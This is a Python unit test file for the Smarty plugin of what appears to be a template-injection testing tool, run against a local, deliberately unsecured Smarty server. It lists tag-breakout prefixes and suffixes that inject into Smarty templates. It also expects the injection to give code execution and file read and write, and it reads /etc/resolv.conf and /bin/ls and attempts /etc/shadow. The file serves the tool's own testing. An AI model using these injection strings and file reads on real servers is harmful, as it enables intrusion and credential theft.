import unittest
import requests
import os
import sys
import random

sys.path.insert(1, os.path.join(sys.path[0], '..'))
from plugins.engines.smarty import Smarty
from basetest import BaseTest

class SmartyUnsecuredTest(unittest.TestCase, BaseTest):

    expected_data = {
        'language': 'php',
        'engine': 'smarty',
        'eval' : 'php' ,
        'exec' : True,
        'write': True,
        'read': True,
        'trailer': '{%(trailer)s}',
        'header': '{%(header)s}',
        'render': '{%(payload)s}',
    }
    
    url = 'http://127.0.0.1:15002/smarty-3.1.29-unsecured.php?inj=*&tpl=%s'
    plugin = Smarty
    
    reflection_tests = [
        (1, 1, '%s', { }),
        (1, 1, 'AAA%sAAA', {}), 
        (1, 1, '{%s}', { 'prefix': '1}', 'suffix' : '{'}),
        (1, 1, '{* %s *}', {}),
        (5, 1, '{if %s}\n{/if}', { 'prefix': '1}{/if}{if 1}', 'suffix' : ''}),
        (5, 1, '{if (%s)}\n{/if}', { 'prefix': '1)}{/if}{if 1}', 'suffix' : ''}),
        (1, 1, '{html_select_date display_days=%s}', { 'prefix': '1}', 'suffix' : '{'}),
        (1, 1, '{html_options values=%s}', { 'prefix': '1}', 'suffix' : '{'}),
        (5, 1, '{assign value="" var="%s" value=""}', { 'prefix': '1" var="" value=""}{assign var="" value=""}', 'suffix' : ''}),
        (5, 1, '{assign value="" var="" value="%s"}', { 'prefix': '1" var="" value=""}{assign var="" value=""}', 'suffix' : ''}),
        (5, 1, '{assign value="" var="" value="`%s`"}', { 'prefix': '1" var="" value=""}{assign var="" value=""}', 'suffix' : ''}),

    ]

    def test_download(self):

        # This is overriden due to the slight
        # difference from the base test_download()
        # obj.read('/dev/null') -> None

        obj, data = self._get_detection_obj_data(self.url % '')
        self.assertEqual(data, self.expected_data)
        
        # Normal ASCII file
        readable_file = '/etc/resolv.conf'
        content = open(readable_file, 'r').read()
        self.assertEqual(content, obj.read(readable_file))
        
        # Long binary file
        readable_file = '/bin/ls'
        content = open(readable_file, 'rb').read()
        self.assertEqual(content, obj.read(readable_file))    
        
        # Non existant file
        self.assertEqual(None, obj.read('/nonexistant'))
        # Unpermitted file
        self.assertEqual(None, obj.read('/etc/shadow'))
        # Empty file
        self.assertEqual(None, obj.read('/dev/null'))
